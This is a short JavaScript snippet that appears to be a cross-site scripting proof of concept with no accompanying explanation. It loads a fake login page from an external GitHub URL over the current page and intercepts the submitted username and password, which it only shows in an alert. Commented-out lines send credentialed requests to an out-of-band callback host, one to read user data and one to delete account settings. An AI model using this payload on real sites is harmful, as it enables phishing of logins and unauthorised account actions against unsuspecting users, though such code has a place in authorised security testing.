fetch("https://raw.githubusercontent.com/MrDottt/login/main/site.html").then(res=>res.text()).then(res => {


  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})

// fetch("https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun/users", { "method": "POST", "credentials": "include"})


// fetch("https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun/user/settings/delete")
